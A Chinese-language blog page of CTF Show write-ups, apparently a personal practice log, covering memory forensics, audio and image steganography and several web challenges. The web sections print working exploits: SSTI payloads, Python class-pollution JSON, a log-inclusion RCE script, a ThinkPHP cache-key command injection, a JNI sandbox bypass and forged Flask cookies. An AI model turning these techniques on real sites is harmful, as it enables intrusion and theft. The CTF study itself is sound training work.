<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=HandheldFriendly content="True"><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Cache-Control content="no-transform"><meta http-equiv=Cache-Control content="no-siteapp"><meta name=generator content="Hugo 0.139.3"><link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon/favicon-16x16.png><link rel=manifest href=/favicon/site.webmanifest><link rel=mask-icon href=/favicon/safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"><title>CTF Show 刷题记录 - zrquan</title>
<meta name=author content="[4shen0ne]"><meta name=description content="A minimal Hugo theme with nice theme color."><meta name=keywords content="ctf"><meta property="og:title" content="CTF Show 刷题记录"><meta name=twitter:title content="CTF Show 刷题记录"><meta property="og:type" content="article"><meta property="og:url" content="https://zrquan.github.io/posts/ctf-show/"><meta property="og:description" content="主要是 Web，也会练一下 Misc"><meta name=twitter:description content="主要是 Web，也会练一下 Misc"><meta property="og:image" content="https://zrquan.github.io/img/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zrquan.github.io/img/og.png"><meta property="article:published_time" content="2024-12-08T00:00:00+08:00"><meta property="article:modified_time" content="2024-12-08T00:00:00+08:00"><style>@media(prefers-color-scheme:dark){body[data-theme=auto] img{filter:brightness(60%)}}body[data-theme=dark] img{filter:brightness(60%)}</style><link rel=stylesheet href=https://zrquan.github.io/assets/css/fuji.min.919e00de23165ea8609cdeaa81e7a2a46143ded68e23a4d4f7434b8a4c011916ce4c55a9a3f842d89378bf91f44e465b9b29debc0267627be3abf47afd3da4bc.css integrity="sha512-kZ4A3iMWXqhgnN6qgeeipGFD3taOI6TU90NLikwBGRbOTFWpo/hC2JN4v5H0TkZbmynevAJnYnvjq/R6/T2kvA=="></head><body data-theme=auto data-theme-auto=false><script data-cfasync=false>var fujiThemeData=localStorage.getItem("fuji_data-theme");fujiThemeData?fujiThemeData!=="auto"&&document.body.setAttribute("data-theme",fujiThemeData==="dark"?"dark":"light"):localStorage.setItem("fuji_data-theme","auto")</script><header></header><main><div class="container-lg clearfix"><div class="col-12 col-md-9 float-left content"><article><h1 class="post-item post-title"><a href=https://zrquan.github.io/posts/ctf-show/>CTF Show 刷题记录</a></h1><div class="post-item post-meta"><span><i class="iconfont icon-today-sharp"></i>&nbsp;2024-12-08</span>
<span><i class="iconfont icon-file-tray-sharp"></i>&nbsp;3749 words</span>
<span><i class="iconfont icon-pricetags-sharp"></i>&nbsp;<a href=/tags/ctf>ctf</a>&nbsp;</span></div><div class="post-content markdown-body"><p>主要是 Web，也会练一下 Misc</p><h2 id=单身杯>单身杯</h2><h3 id=easy-mem-1>easy_mem_1</h3><p>用 MemProcFS 分析内存并挂载到 dmp 目录</p><pre><code class=language-text>./memprocfs -device ~/20241029-055419.dmp -mount ~/dmp
</code></pre><ul><li>计算机名：dmp/sys/computername.txt</li><li>IP 地址：dmp/sys/net/netstat.txt</li><li>build 版本号：dmp/sys/version-build.txt</li></ul><p>最终得到 ctfshow{ZHUYUN_S_PC_192.168.26.129_22621}</p><h3 id=easy-mem-2>easy_mem_2</h3><p>给 MemProcFS 加上 <code>-forensic 1</code> 启用 forensic mode</p><p>可以找到目录 dmp/forensic/files/ROOT/Users/h/Documents/Tencent Files/54297198 以确认 QQ 号</p><p>短剧名和 BV 号都能在浏览器历史 dmp/forensic/web/web.txt 中找到</p><p>最终得到 ctfshow{54297198_穿成魔尊后我一心求死_BV1ZU4y1G7AP}</p><h3 id=easy-mem-3>easy_mem_3</h3><p>翻一下 dmp/sys/proc/proc-v.txt 里的进程信息，看到一个可疑进程</p><pre><code class=language-text>---- Hmohgnsyc.exe           10504   3940 32  U* h                \Device\HarddiskVolume3\Users\h\AppData\Roaming\ToDesk\dev\Hmohgnsyc.exe
                                                                  C:\Users\h\AppData\Roaming\ToDesk\dev\Hmohgnsyc.exe
                                                                  &quot;C:\Users\h\AppData\Roaming\ToDesk\dev\Hmohgnsyc.exe&quot;
                                                                  2024-10-29 05:52:14 UTC -&gt;                     ***
                                                                  Medium
</code></pre><p>这个叫 Hmohgnsyc.exe 的程序放在 ToDesk 的目录里，查看该程序的信息
dmp/name/Hmohgnsyc.exe-10504/modules/Hmohgnsyc.exe/versioninfo.txt:</p><pre><code class=language-text>Company Name:      http://www.jieba.net
File Description:  超级解霸核心组件(升级界面)
File Version:      1, 0, 0, 630
Internal Name:     Update
Legal Copyright:   Copyright 2009 http://www.jieba.net
Original Filename: Update.exe
Product Name:      Update Module
Product Version:   1, 0, 0, 630
</code></pre><p>最后提交：ctfshow{Hmohgnsyc.exe_todesk_jieba.net}</p><h3 id=没耳朵都可以>没耳朵都可以</h3><p>mp3 文件帧头部结构中，有一个 original 位用来表示文件是否为原版，详情参考：
<a href=https://www.cnblogs.com/shakin/p/4012780.html target=_blank>https://www.cnblogs.com/shakin/p/4012780.html</a></p><p>010Editor 打开文件，根据提示找到以下标志位：</p><figure><img src=/ox-hugo/_20241206_154228screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241206_154228screenshot.png></figure><p>写个脚本将所有标志位提取出来</p><pre><code class=language-python>original = &quot;&quot;
with open(&quot;fox01.mp3&quot;, &quot;rb&quot;) as f:
    content = f.read()
    for i, b in enumerate(content):
        if b == 0xFF and content[i+1] == 0xFB and (content[i+2] in (0xE0, 0xE2)):
            # 将 bytes 转成二进制表示
            binstr = &quot;&quot;.join(map(lambda b: f&quot;{b:08b}&quot;, content[i:i+4]))
            original += binstr[29]
</code></pre><p>拿到二进制字符串后，通过调整长宽来形成可读的 flag，可以写个脚本将所有可能的长宽组合都生成图片</p><pre><code class=language-python>import os
from PIL import Image

def create_images_from_binary(binstr: str, output_dir: str, max_width=1000):
    os.makedirs(output_dir, exist_ok=True)
    length = len(binstr)
    for width in range(1, max_width + 1):
        # 计算高度，向上取整
        height = (length + width - 1) // width
        image = Image.new(&quot;1&quot;, (width, height))
        pixels = image.load()

        # 填充像素
        for i in range(length):
            x = i % width
            y = i // width
            pixels[x, y] = int(binstr[i])
        # 剩余像素补0
        for i in range(length, height * width):
            x = i % width
            y = i // width
            pixels[x, y] = 0

        image_path = os.path.join(output_dir, f&quot;img_{width}x{height}.png&quot;)
        image.save(image_path)
        print(f&quot;Saved image: {image_path}&quot;)

create_images_from_binary(original.strip(), &quot;images&quot;)
</code></pre><p>可以从图片 img_301x33.png 中抠出 flag</p><figure><img src=/ox-hugo/_20241206_155439screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241206_155439screenshot.png></figure><h3 id=好玩的-php>好玩的 PHP</h3><p>PHP 里一个数字的 md5 值和它的字符串的 md5 值是一样的，即 <code>md5(123) === md5("123")</code></p><p>所以答案是：</p><pre><code class=language-php>&lt;?php
class ctfshow {
    private $d = '1';
    private $s = '2';
    private $b = '3';
    private $ctf = 123;
}
$o = new ctfshow();
echo urlencode(serialize($o));
</code></pre><p>也可以用 <a href=https://www.php.net/manual/zh/math.constants.php#constant.inf target=_blank>INF</a>：</p><pre><code class=language-php>&lt;?php
class ctfshow {
    private $d = 'I';
    private $s = 'N';
    private $b = 'F';
    private $ctf = INF;
}
$o = new ctfshow();
echo urlencode(serialize($o));
</code></pre><h3 id=迷雾重重>迷雾重重</h3><p>在 IndexController.php 中有几个 test 开头的路由方法，漏洞其实在 testJson 方法中，该方法会读取 JSON 格式的请求参数 data，然后通过 <code>view('index/view', $data)</code> 将数据传到模板中渲染</p><p>view 方法的实现位于 support/helpers.php</p><pre><code class=language-php>function view(string $template, array $vars = [], string $app = null, string $plugin = null): Response
{
    $request = \request();
    $plugin = $plugin === null ? ($request-&gt;plugin ?? '') : $plugin;
    $handler = \config($plugin ? &quot;plugin.$plugin.view.handler&quot; : 'view.handler');
    return new Response(200, [], $handler::render($template, $vars, $app, $plugin));
}
</code></pre><p>从 config/view.php 中可以找到进行模板渲染的 handler 类，继续分析它的 render 方法，发现一处变量覆盖漏洞</p><figure><img src=/ox-hugo/_20241206_163918screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241206_163918screenshot.png></figure><p>基于这个变量覆盖漏洞，我们可以通过以下步骤来执行命令：</p><ol><li>枚举 /proc/{i}/cmdline 来获取网站根目录的绝对路径</li><li>用 PHP 代码覆盖 <code>__template_path__</code> 变量，通过触发异常将代码写入 webman 的日志文件</li><li>由于 webman 的日志文件命名相对固定，可以再次通过变量覆盖来包含刚刚写入代码的日志，以此执行代码</li></ol><p>将这些步骤通过脚本实现：</p><pre><code class=language-python>from datetime import datetime
import json
import httpx

BASEURL = &quot;https://55b74c3a-f741-41d3-803e-e327476e7f7b.challenge.ctf.show&quot;
URL = f&quot;{BASEURL}/index/testJson&quot;

def get_webroot() -&gt; str:
    with httpx.Client(verify=False) as cli:
        for i in range(1, 100):
            data = json.dumps(
                {&quot;name&quot;: &quot;guest&quot;, &quot;__template_path__&quot;: f&quot;/proc/{i}/cmdline&quot;}
            )
            resp = cli.get(URL, params={&quot;data&quot;: data})
            if &quot;start.php&quot; in resp.text:
                return resp.text.split(&quot;start_file=&quot;)[1][:-11]


def write_payload(webroot: str, cmd: str):
    with httpx.Client(verify=False) as cli:
        data = json.dumps(
            {
                &quot;name&quot;: &quot;guest&quot;,
                &quot;__template_path__&quot;: f&quot;&lt;?php system('{cmd}');?&gt;&quot;,
            }
        )
        resp = cli.get(URL, params={&quot;data&quot;: data})
        # print(resp.text)

def include_payload(webroot: str):
    with httpx.Client(verify=False) as cli:
        logfile = datetime.now().strftime(r&quot;webman-%Y-%m-%d.log&quot;)
        data = json.dumps(
            {&quot;name&quot;: &quot;guest&quot;, &quot;__template_path__&quot;: f&quot;{webroot}/runtime/logs/{logfile}&quot;}
        )
        resp = cli.get(URL, params={&quot;data&quot;: data})
        # print(resp.text)

if __name__ == &quot;__main__&quot;:
    webroot = get_webroot()

    cmd = &quot;cat /s000ecretF1ag999.txt&quot;
    write_payload(webroot, f&quot;{cmd} &gt; {webroot}/public/stdout.txt&quot;)
    include_payload(webroot)

    with httpx.Client(verify=False) as cli:
        cmd_stdout = cli.get(f&quot;{BASEURL}/stdout.txt&quot;).text
        print(cmd_stdout)
</code></pre><h3 id=ez-inject>ez_inject</h3><p>注册登录后看到提示，并且 Cookie 中会设置一个 JWT</p><pre><code class=language-text>你觉得你能爆破出来密钥？我觉得吧不如去试着污染，在哪里呢？
登录还是注册?别忘了注册用户哦
</code></pre><p>那么考点自然是 Python 原型链污染（）和 Flask</p><p>tip: 实际上 Python 中并没有原型链这个概念，而是通过<a href=https://docs.python.org/zh-cn/3.13/reference/datamodel.html target=_blank>特殊属性/方法</a>达成类似原型链污染的攻击技巧</p><p>在注册接口可以通过发送以下数据来篡改 Flask 的 SECRET_KEY，注意需要修改成 JSON 格式，因为需要利用对字典的 merge 操作来“污染原型链”</p><pre><code class=language-json>{&quot;username&quot;: &quot;hacker&quot;, &quot;password&quot;: &quot;qwe123&quot;, &quot;__init__&quot;: {&quot;__globals__&quot;: {&quot;app&quot;: {&quot;config&quot;: {&quot;SECRET_KEY&quot;: &quot;qwe123&quot;}}}}}
</code></pre><p>官方 wp 是像这样修改 SECRET_KEY 来获取管理员权限，但其实可以直接“污染” is_admin</p><pre><code class=language-json>{&quot;username&quot;: &quot;hacker&quot;, &quot;password&quot;: &quot;qwe123&quot;, &quot;is_admin&quot;: 1}
</code></pre><p>然后修改 JWT 的 is_admin 字段获取管理员权限</p><pre><code class=language-bash>flask-unsign --cookie &quot;{'is_admin': 1, 'username': 'hacker'}&quot; --secret qwe123 --sign
# eyJpc19hZG1pbiI6MSwidXNlcm5hbWUiOiJoYWNrZXIifQ.Z1LH_w.xUsHvKI86GWV5Yw5uFA7Gec99o4
</code></pre><p>拿到管理员权限后可以在 /secret 中看到提示</p><pre><code class=language-text>You can try to inject on &quot;echo&quot;!
</code></pre><p>经过尝试确认 echo 接口存在 SSTI，在注入时不需要外面的大括号，而且 waf 拦截了一些关键字。最终通过以下 payload 拿到 flag：</p><pre><code class=language-text>self['__in''it__']['__glo''bals__']['__buil''tins__']['__imp''ort__']('os').popen('ca''t /flag').read()
</code></pre><h3 id=ezzz-ssti>ezzz_ssti</h3><p>Jinja2 SSTI，但是限制了 payload 的长度</p><p>绕过长度限制可以参考：<a href=https://blog.csdn.net/weixin_43995419/article/details/126811287 target=_blank>https://blog.csdn.net/weixin_43995419/article/details/126811287</a></p><p>Flask 中有一个全局对象 config，是一个继承于字典的数据类，用来保存一些配置信息，可以通过它的 update 方法将任意对象设置到 config 的属性中。那么，我们就可以将过长的 payload 分段保存到 config 中，并设置一个很短的属性名，以此来绕过长度限制</p><p>bypass：</p><pre><code class=language-nil>{{config.update(c=config.update)}}
{{config.update(g=&quot;__globals__&quot;)}}
{{config.c(f=lipsum[config.g])}}
{{config.c(o=config.f.os)}}
{{config.c(p=config.o.popen)}}
{{config.p(&quot;cat /f*&quot;).read()}}
</code></pre><h3 id=简单的文件上传>简单的文件上传</h3><p>上传一个执行命令的 jar 包并执行，会得到以下异常信息：</p><pre><code class=language-nil>Exception in thread &quot;main&quot; java.security.AccessControlException: access denied (&quot;java.io.FilePermission&quot; &quot;&lt;&gt;&quot; &quot;execute&quot;)
at java.security.AccessControlContext.checkPermission(AccessControlContext.java:472)
at java.security.AccessController.checkPermission(AccessController.java:884)
at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
at java.lang.SecurityManager.checkExec(SecurityManager.java:799)
at java.lang.ProcessBuilder.start(ProcessBuilder.java:1018)
at java.lang.Runtime.exec(Runtime.java:620)
at java.lang.Runtime.exec(Runtime.java:450)
at java.lang.Runtime.exec(Runtime.java:347)
at org.example.Main.main(Main.java:5)
</code></pre><p>那么显然这题的考点是绕过 Security Manager，经过尝试后可以通过 JNI 来绕过，细节参考：<a href=https://www.anquanke.com/post/id/151398#h3-8 target=_blank>https://www.anquanke.com/post/id/151398#h3-8</a></p><p>题目还有两个需要处理的地方：</p><ol><li>只能上传 jar 文件，所以要将共享链接库的后缀改一下，并不影响使用</li><li>得知道上传目录的位置是 /var/www/html/uploads</li></ol><p>将以下两个 Java 文件编译成 jar 包</p><pre><code class=language-java>package org.example;

public class Main {
    public static void main(String[] args) throws Exception {
        NativeCall.exec(&quot;cat /secretFlag000.txt&quot;);
    }
}
</code></pre><pre><code class=language-java>package org.example;

public class NativeCall {
    static {
        System.load(&quot;/var/www/html/uploads/libNativeCall.jar&quot;);
    }
    public native static String exec(String cmd);
}
</code></pre><p>我是直接使用 maven 打包，所以要在 pom.xml 中添加配置</p><pre><code class=language-xml>&lt;build&gt;
    &lt;plugins&gt;
        &lt;plugin&gt;
            &lt;!-- Build an executable JAR --&gt;
            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
            &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;
            &lt;configuration&gt;
                &lt;archive&gt;
                    &lt;manifest&gt;
                        &lt;mainClass&gt;org.example.Main&lt;/mainClass&gt;
                    &lt;/manifest&gt;
                &lt;/archive&gt;
            &lt;/configuration&gt;
        &lt;/plugin&gt;
    &lt;/plugins&gt;
&lt;/build&gt;
</code></pre><p>然后是将恶意 C 代码编译成共享链接库</p><pre><code class=language-c>#include &quot;NativeCall.h&quot;
#include&lt;stdlib.h&gt;

#ifdef __cplusplus
extern &quot;C&quot;
{
#endif


JNIEXPORT jstring JNICALL Java_org_example_NativeCall_exec(
        JNIEnv *env, jclass cls, jstring j_str)
{
    const char *c_str = NULL;
    char buff[128] = { 0 };
    c_str = (*env)-&gt;GetStringUTFChars(env, j_str, NULL);
    if (c_str == NULL)
    {
        printf(&quot;out of memory.n&quot;);
        return NULL;
    }
    system(c_str);  // execute command
    (*env)-&gt;ReleaseStringUTFChars(env, j_str, c_str);
    return (*env)-&gt;NewStringUTF(env, buff);
}
#ifdef __cplusplus
}
#endif
</code></pre><p>首先要生成 NativeCall 类的头文件，然后用 gcc 编译共享链接库</p><pre><code class=language-shell># 1. 编译 NativeCall.class
javac src/main/java/org/example/NativeCall.java -d bin
# 2. 生成头文件 NativeCall.h
javah -jni -classpath ./bin -o NativeCall.h org.example.NativeCall
# 3. 编译共享链接库，以 jar 为后缀
gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared NativeCall.c -o libNativeCall.jar
</code></pre><p>将两个 jar 文件都上传后直接执行就能读到 flag</p><h2 id=西瓜杯>西瓜杯</h2><h3 id=她说她想结婚>她说她想结婚</h3><p>附件是周处除三害的截图</p><figure><img src=/ox-hugo/_20241207_121225screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241207_121225screenshot.png></figure><p>起手 binwalk+foremost 拿到藏在图片里的压缩包，压缩包用了伪加密，用 010Editor 搜
deFlags 将所有 9 改成 0 即可解压得到一堆 txt 文件</p><pre><code class=language-shell>❯ eza -l --time-style full-iso
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:27.000000000 +0800 0.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:21.000000000 +0800 1.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:41.000000000 +0800 2.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:27:38.000000000 +0800 3.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:19.000000000 +0800 4.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:36.000000000 +0800 5.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:22.000000000 +0800 6.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:03.000000000 +0800 7.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:24.000000000 +0800 8.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:27:28.000000000 +0800 9.txt
.rwxr-xr-x   0 zrquan 2011-08-28 16:28:39.000000000 +0800 10.txt
.rwxr-xr-x 22k zrquan 2024-06-22 00:52:12.752078000 +0800 flag.txt
.rwxr-xr-x   0 zrquan 2012-05-20 13:14:52.000000000 +0800 tips.txt
</code></pre><p>除了 flag.txt 有一堆意义不明的中文文本，其他文件都是空的，但是明显时间被动过手脚，特别是 tips.txt 的修改时间看到 5201314</p><p>首先看 flag.txt，用 bat 看一下内容</p><figure><img src=/ox-hugo/_20241207_125343screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241207_125343screenshot.png></figure><p>从末尾的一堆空白字符可以想到 <a href=https://darkside.com.au/snow/ target=_blank>SNOW 隐写</a>，而且题目提示了图片中陈桂林的台词是某个
key，那么把台词作为 password 用 SNOW 解密 flag.txt 就可以拿到前半个 flag</p><figure><img src=/ox-hugo/_20241207_125802screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241207_125802screenshot.png></figure><p>再回到剩下的 txt 文件，之前发现它们的时间有蹊跷，那么检查一下它们的时间戳</p><pre><code class=language-shell>❯ eza -l --time-style '+%s'
.rwxr-xr-x   0 zrquan 1314520107 0.txt
.rwxr-xr-x   0 zrquan 1314520101 1.txt
.rwxr-xr-x   0 zrquan 1314520121 2.txt
.rwxr-xr-x   0 zrquan 1314520058 3.txt
.rwxr-xr-x   0 zrquan 1314520099 4.txt
.rwxr-xr-x   0 zrquan 1314520116 5.txt
.rwxr-xr-x   0 zrquan 1314520102 6.txt
.rwxr-xr-x   0 zrquan 1314520083 7.txt
.rwxr-xr-x   0 zrquan 1314520104 8.txt
.rwxr-xr-x   0 zrquan 1314520048 9.txt
.rwxr-xr-x   0 zrquan 1314520119 10.txt
.rwxr-xr-x 22k zrquan 1718988732 flag.txt
.rwxr-xr-x   0 zrquan 1337490892 tips.txt
</code></pre><p>发现时间戳都是以 1314520 开头，而且剩下的数字都 ascii 码表内，我们尝试将其提取出来解码</p><pre><code class=language-python>result = &quot;&quot;
for i in [107,101,121,58,99,116,102,83,104,48,119]:
    result += chr(i)
print(result)
# key:ctfSh0w
</code></pre><p>又拿到一个 key，用在哪里呢？原来最初的 flag.png 中还藏了东西，下图中 <code>9E97BA2A</code> 是
OurSecret 加密的特征。OurSecret 是一个文档加密工具，可以将一些私密文件隐藏在其他文件里，需要通过密码来提取，也就是这个 key</p><figure><img src=/ox-hugo/_20241207_140211screenshot.png class="img-zoomable medium-zoom-image" alt=/ox-hugo/_20241207_140211screenshot.png></figure><p>直接用 OurSecret 打开 flag.png 会识别不到里面的加密数据，需要将后面 zip 文件的数据(<code>504B0304</code> 开头)先删除，然后拿到以下文本：</p><pre><code class=language-nil>JRDEWV2JKIZUKR2KJBCVGWKTJBGEUVSWIVGVIWKHIJGFOWKXJJLE2UK2IVKVES2WJZFEYR2RKZKDES22GJLFKM2DIZEEMSKGINIEUNI=
</code></pre><p>用 CyberChef 的 Magic 模块直接解出 flag</p><pre><code class=language-text>Base32 -&gt; Base32 -&gt; Base64 -&gt; Base64
</code></pre><p>最后得到：ctfshow{W1sh1ng_every0ne_4_happy_time_pl4ying}</p><h3 id=你是我的眼>你是我的眼</h3><p>反编译 jar 然后审计 Main.java</p><pre><code class=language-java>public class Main {
   private static final String PART1 = &quot;U2NF9CSUFOTUF9&quot;;
   private static final String PART2 = &quot;Xw-&quot;;
   private static final String PART3 = &quot;Q1RGU2hvd3tURVNUX0&quot;;
   private static final String PART4 = &quot;JBU0&quot;;

   public static String customDecode(String input) {
      String standardInput = input.replace('-', '+').replace('_', '/');
      return new String(Base64.getDecoder().decode(standardInput));
   }

   public static void main(String[] args) {
      Scanner scanner = new Scanner(System.in);
      System.out.println(&quot;请输入FLAG:&quot;);
      String userInput = scanner.nextLine();
      String flag = &quot;Q1RGU2hvd3tURVNUX0JBU0U2NF9CSUFOTUF9Xw-&quot;;
      String decodedFlag = customDecode(flag);
      String cleanInput = userInput.replace(&quot;_&quot;, &quot;&quot;).replace(&quot;\u000f&quot;, &quot;&quot;);
      if (checkflag(cleanInput, decodedFlag)) {
         System.out.println(&quot;flag正确&quot;);
      } else {
         System.out.println(&quot;输入错误&quot;);
      }

      scanner.close();
   }

   private static boolean checkflag(String input, String CTFflag) {
      return CTFflag.replace(&quot;_&quot;, &quot;&quot;).replace(&quot;\u000f&quot;, &quot;&quot;).equals(input);
   }
}
</code></pre><p>官方 wp 中出题的思路应该是比较复杂的，但其实直接 base64 解码 flag 变量就完事了&mldr;</p><pre><code class=language-shell>❯ echo 'Q1RGU2hvd3tURVNUX0JBU0U2NF9CSUFOTUF9Xw-' | base64 -d
CTFShow{TEST_BASE64_BIANMA}_base64: invalid input
</code></pre><p>提交 CTFShow{TEST_BASE64_BIANMA}</p><h3 id=codeinject>CodeInject</h3><p>签到题，直接执行代码</p><pre><code class=language-text>http --verify no -f https://2db56ea5-d48e-469f-ae42-194cc9bd7a06.challenge.ctf.show/ 1=&quot;system('cat /000f1ag.txt')&quot;
</code></pre><h3 id=tpdoor>tpdoor</h3><p>题目提供的代码很有限，只知道可以通过 isCache 参数控制 request_cache_key 配置项</p><p>先通过路由错误确认 ThinkPHP 的版本为 V8.0.3</p><pre><code class=language-text>https://acf3a4dd-e196-4d00-ba5a-4443ee775efb.challenge.ctf.show/?s=foo
</code></pre><p>然后需要审计一下 ThinkPHP 源码，既然可以控制缓存机制的 key，题目代码中也启用了检查缓存的中间件 <a href=https://github.com/top-think/framework/blob/v8.0.3/src/think/middleware/CheckRequestCache.php target=_blank>CheckRequestCache</a>，就从它入手</p><p>审计代码可以发现漏洞存在于 parseCacheKey 方法，<a href=https://github.com/top-think/framework/blob/5e59fb1e2bcb400c6f82e99d1a40dd058afc8563/src/think/middleware/CheckRequestCache.php#L152 target=_blank>L152</a> 以 <code>|</code> 分割 key，然后将后面部分赋值给 <code>$fun</code> 。之后没有经过任何安全过滤，在 <a href=https://github.com/top-think/framework/blob/5e59fb1e2bcb400c6f82e99d1a40dd058afc8563/src/think/middleware/CheckRequestCache.php#L178 target=_blank>L178</a> 把 <code>$fun</code> 作为函数执行，而参数就是分割后的前面部分</p><p>so</p><pre><code class=language-shell>http -b bd7550d8-af8b-4361-9bad-e169fd8ec931.challenge.ctf.show isCache=='ls /|system' cacheTime==5
http -b bd7550d8-af8b-4361-9bad-e169fd8ec931.challenge.ctf.show isCache=='cat /000f1ag.txt|system' cacheTime==5
</code></pre><details><summary>tips</summary><div class=details><ol><li>如果你已经触发了缓存而且没设置 cacheTime，重启容器吧，不然一个小时后才会刷新缓存</li><li>拿不到结果可以多刷新几次页面</li></ol></div></details><h3 id=easy-polluted>easy_polluted</h3><p>Python 的原型污染，需要绕过黑名单，而且黑名单中有下划线，估计就是编码绕过了</p><pre><code class=language-python>def filter(user_input):
    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']
    for pattern in blacklisted_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
</code></pre><p>审计代码可以看到会先用 <code>filter</code> 函数检查黑名单，然后用 <code>json.loads</code> 解析 JSON 数据，而按照 JSON 的规范，遇到 <code>\u</code> 开头的 unicode 转义序列是会自动解析成 unicode 字符的</p><pre><code class=language-python>@app.route('/',methods=['POST'])
def index():
    username = request.form.get('username')
    password = request.form.get('password')
    session[&quot;username&quot;] = username
    session[&quot;password&quot;] = password
    Evil = evil()
    if request.data:
        if filter(str(request.data)):
            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;
        else:
            merge(json.loads(request.data), Evil)
            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;
    return render_template(&quot;index.html&quot;)

@app.route('/admin',methods=['POST', 'GET'])
def templates():
    username = session.get(&quot;username&quot;, None)
    password = session.get(&quot;password&quot;, None)
    if username and password:
        if username == &quot;adminer&quot; and password == app.secret_key:
            return render_template(&quot;flag.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())
        else:
            return &quot;Unauthorized&quot;
    else:
        return f'Hello,  This is the POLLUTED page.'
</code></pre><p>另外，flag.html 中用的并不是 jinja 的默认语法</p><pre><code class=language-html>&lt;body&gt;
    这又是什么jinja语法啊！
    [#flag#]
&lt;/body&gt;
</code></pre><p>所以需要以下几步来拿 flag</p><ol><li><p>通过原型污染修改 SECRET_KEY</p></li><li><p>通过原型污染修改 jinja_env，以修改引用变量的语法</p></li><li><p>用 unicode 转义序列绕过黑名单检查</p><pre><code class=language-json>{&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;: {&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;: {&quot;\u0061\u0070\u0070&quot;: {&quot;config&quot;: {&quot;SECRET\u005fKEY&quot;: &quot;ctfshow&quot;}, &quot;\u006a\u0069\u006e\u006a\u0061\u005f\u0065\u006e\u0076&quot;: {&quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0073\u0074\u0061\u0072\u0074\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;: &quot;[#&quot;,&quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0065\u006e\u0064\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;: &quot;#]&quot;}}}}}
</code></pre></li><li><p>使用和 SECRET_KEY 相同的密码登录会话，访问 /admin</p><pre><code class=language-text>flask-unsign --cookie &quot;{'password': 'ctfshow', 'username': 'adminer'}&quot; --secret ctfshow --sign
</code></pre></li></ol><h2 id=未完持续-dot-dot-dot>未完持续&mldr;</h2></div></article><div class="license markdown-body"><blockquote><p>Unless otherwise noted, the content of this site is licensed under <a rel=license href=http://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a>.</p></blockquote></div><div class=post-comment data-comment=disqus><span class=post-comment-notloaded><i class="iconfont icon-chatbox-ellipses-sharp"></i>&nbsp;Load comments</span><div id=disqus_thread style=display:none></div><script>function loadComment(){var t=document.querySelector(".post-comment"),n=function(){this.page.url="https://zrquan.github.io/posts/ctf-show/",this.page.identifier="ctf-show"},e=document.createElement("script");e.src="https://4shen0ne.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),document.querySelector("#disqus_thread").removeAttribute("style"),(document.body||document.head).appendChild(e),document.querySelector("span.post-comment-notloaded").setAttribute("style","display: none;")}</script></div></div><aside class="col-12 col-md-3 float-left sidebar"><div class="sidebar-item sidebar-pages"><h3>Pages</h3><ul><li><a href=/>Home</a></li><li><a href=/archives/>Archives</a></li><li><a href=/search/>Search</a></li><li><a href=/index.xml>Feed</a></li></ul></div><div class="sidebar-item sidebar-toc"><h3>Table of Contents</h3><nav id=TableOfContents><ul><li><a href=#单身杯>单身杯</a><ul><li><a href=#easy-mem-1>easy_mem_1</a></li><li><a href=#easy-mem-2>easy_mem_2</a></li><li><a href=#easy-mem-3>easy_mem_3</a></li><li><a href=#没耳朵都可以>没耳朵都可以</a></li><li><a href=#好玩的-php>好玩的 PHP</a></li><li><a href=#迷雾重重>迷雾重重</a></li><li><a href=#ez-inject>ez_inject</a></li><li><a href=#ezzz-ssti>ezzz_ssti</a></li><li><a href=#简单的文件上传>简单的文件上传</a></li></ul></li><li><a href=#西瓜杯>西瓜杯</a><ul><li><a href=#她说她想结婚>她说她想结婚</a></li><li><a href=#你是我的眼>你是我的眼</a></li><li><a href=#codeinject>CodeInject</a></li><li><a href=#tpdoor>tpdoor</a></li><li><a href=#easy-polluted>easy_polluted</a></li></ul></li><li><a href=#未完持续-dot-dot-dot>未完持续&mldr;</a></li></ul></nav></div></aside></div><div class=btn><div class=btn-menu id=btn-menu><i class="iconfont 